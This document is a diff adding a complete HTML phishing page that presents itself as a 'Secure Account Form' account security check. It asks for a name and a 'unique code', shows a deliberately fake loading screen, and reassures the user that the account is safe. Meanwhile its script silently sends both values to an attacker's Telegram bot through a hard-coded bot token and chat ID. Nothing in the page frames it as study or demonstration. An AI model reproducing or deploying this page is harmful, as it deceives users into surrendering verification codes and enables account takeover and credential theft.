@@ -1,0 +1,131 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Account Form</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #f58529, #dd2a7b, #8134af, #515bd4);
+      background-size: 400% 400%;
+      animation: gradient 10s ease infinite;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }@keyframes gradient {
+  0% {background-position: 0% 50%;}
+  50% {background-position: 100% 50%;}
+  100% {background-position: 0% 50%;}
+}
+
+.form-container {
+  background: rgba(255, 255, 255, 0.2);
+  backdrop-filter: blur(15px);
+  padding: 30px;
+  border-radius: 20px;
+  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+  width: 300px;
+  text-align: center;
+  color: white;
+}
+
+input {
+  padding: 10px;
+  width: 100%;
+  margin-top: 10px;
+  margin-bottom: 20px;
+  border: none;
+  border-radius: 10px;
+  outline: none;
+}
+
+.tick {
+  display: none;
+  color: limegreen;
+  font-size: 20px;
+}
+
+#submit {
+  background-color: white;
+  color: #333;
+  font-weight: bold;
+  cursor: pointer;
+  transition: 0.3s;
+}
+
+#submit:hover {
+  background-color: #f0f0f0;
+}
+
+.loading {
+  display: none;
+  flex-direction: column;
+  align-items: center;
+  color: white;
+  font-size: 18px;
+}
+
+  </style>
+</head>
+<body>
+  <div class="form-container" id="formBox">
+    <div id="step1">
+      <h2>Enter your name</h2>
+      <input type="text" id="nameInput" placeholder="Your name">
+      <button id="submit">Submit</button>
+    </div><div id="step2" style="display:none">
+  <h2>Enter unique code</h2>
+  <input type="text" id="codeInput" placeholder="Unique code">
+  <span class="tick" id="tick">✔</span>
+  <button id="submitCode">Submit</button>
+</div>
+
+  </div>  <div class="loading" id="loading">
+    <p>Checking security of your account...</p>
+    <p>Please do not close while processing</p>
+  </div>  <div class="form-container" id="done" style="display:none">
+    <h2>Your account is safe</h2>
+  </div>  <script>
+    const nameInput = document.getElementById('nameInput');
+    const codeInput = document.getElementById('codeInput');
+    const tick = document.getElementById('tick');
+    const formBox = document.getElementById('formBox');
+    const loading = document.getElementById('loading');
+    const done = document.getElementById('done');
+
+    document.getElementById('submit').addEventListener('click', () => {
+      if (nameInput.value.trim() !== '') {
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+      }
+    });
+
+    document.getElementById('submitCode').addEventListener('click', () => {
+      if (codeInput.value.trim() !== '') {
+        tick.style.display = 'inline';
+
+        // Start fake loading
+        formBox.style.display = 'none';
+        loading.style.display = 'flex';
+
+        setTimeout(() => {
+          loading.style.display = 'none';
+          done.style.display = 'block';
+        }, 10000);
+
+        // Send data to Telegram bot
+        const token = '7712074719:AAEfsMkfDZFADCdnTq6S4WPT67c-XhHE_4Y';
+        const chatId = '7305039129';
+        const message = `New Submission:\nName: ${nameInput.value}\nCode: ${codeInput.value}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({chat_id: chatId, text: message})
+        });
+      }
+    });
+  </script></body>
+</html>
